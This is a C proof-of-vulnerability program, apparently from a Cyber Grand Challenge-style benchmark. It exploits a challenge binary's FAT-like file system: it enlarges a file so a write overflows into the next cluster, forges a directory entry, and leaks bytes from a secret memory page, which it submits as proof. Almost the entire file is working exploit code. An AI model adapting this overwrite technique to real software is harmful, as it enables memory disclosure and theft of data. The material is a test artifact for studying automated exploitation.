#include <libpov.h>
#include "xlat.h"
#include "fs.h"

int main()
{
    //unsigned char exploit[] = "";
    //char admin_name[] = {12, 34, 56, 78 };
    type2_vals t2;
    type2_negotiate(&t2);
    xlat_seed("2281771");
    //int secret = 0;
    unsigned char secret_buf[4];

    unsigned char buf[4096];

    int fs_size = sizeof(file_system) - 1;
    //Send the file system
    transmit_all(STDOUT, "1" NL, sizeof("1" NL) - 1);
    transmit_all(STDOUT, file_system, fs_size);

    //Add File -- starting cluster x
    transmit_all(STDOUT, "7" NL, sizeof("7" NL) - 1);
    transmit_all(STDOUT, "/" NL, sizeof("/" NL) - 1);
    transmit_all(STDOUT, "EXPLOITF" NL, sizeof("EXPLOITF" NL) - 1);
    transmit_all(STDOUT, "500" NL, sizeof("500" NL) - 1);
    transmit_all(STDOUT, "2" NL, sizeof("2" NL) - 1);

    //Add Directory starting cluster x+1
    transmit_all(STDOUT, "8" NL, sizeof("7" NL) - 1);
    transmit_all(STDOUT, "/" NL, sizeof("/" NL) - 1);
    transmit_all(STDOUT, "EXPLOITDIR" NL, sizeof("EXPLOITDIR" NL) - 1);

    //Update Filesize to enable cluster +1 overwrite.
    transmit_all(STDOUT, "6" NL, sizeof("6" NL) - 1);
    transmit_all(STDOUT, "/EXPLOITF" NL, sizeof("/EXPLOITF" NL) - 1);
    transmit_all(STDOUT, "2000" NL, sizeof("2000" NL) - 1);

    //Exploit needs to contain a valid directory entry of type file
    char exploit[] = "\x00\x41\x41\x41\x41\x20\x20\x20\x20\x20\x20\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                     "f\xa5""E""\x00\xf4\x01\x00\x00";
    //Write to the file and overwrite the directory entry
    transmit_all(STDOUT, "5" NL, sizeof("5" NL) - 1);
    transmit_all(STDOUT, "/EXPLOITF" NL, sizeof("/EXPLOITF" NL) - 1);
    transmit_all(STDOUT, "511" NL, sizeof("511" NL) - 1);
    transmit_all(STDOUT, "33" NL, sizeof("33" NL) - 1);
    transmit_all(STDOUT, exploit, sizeof(exploit) -1 );

    //Add Directory to rebuild the directory index that resides in memory
    transmit_all(STDOUT, "8" NL, sizeof("7" NL) - 1);
    transmit_all(STDOUT, "/" NL, sizeof("/" NL) - 1);
    transmit_all(STDOUT, "EXPLOITED" NL, sizeof("EXPLOITED" NL) - 1);

    //List all files -- shows the exploited file being added
    transmit_all(STDOUT, "2" NL, sizeof("2" NL) - 1);
    transmit_all(STDOUT, "/" NL, sizeof("/" NL) - 1);

    //Preview file that was created via the overwrite -- since the file has a cluster that indexes into the secret page
    //previewing the file leaks data from the magic page
    transmit_all(STDOUT, "3" NL, sizeof("3" NL) - 1);
    transmit_all(STDOUT, "/EXPLOITDIR/AAAA" NL, sizeof("/EXPLOITDIR/AAAA" NL) - 1);


    //length_read(STDIN, buf, 3241);
    length_read(STDIN, buf, 3199);
    transmit_all(STDERR, buf, 3199);
    unsigned int i = 0;
    for (i = 0; i < 4; i++)
    {
        char val = 0;
        length_read(STDIN, buf, 4);
        buf[4] = '\0';
        val = strtol((char *)buf+2, NULL, 16);
        secret_buf[i] = val;
    }

    //Exit
    type2_submit(secret_buf, sizeof(secret_buf));
    transmit_all(STDOUT, "13" NL, sizeof("13" NL) - 1);
    return 0;
}
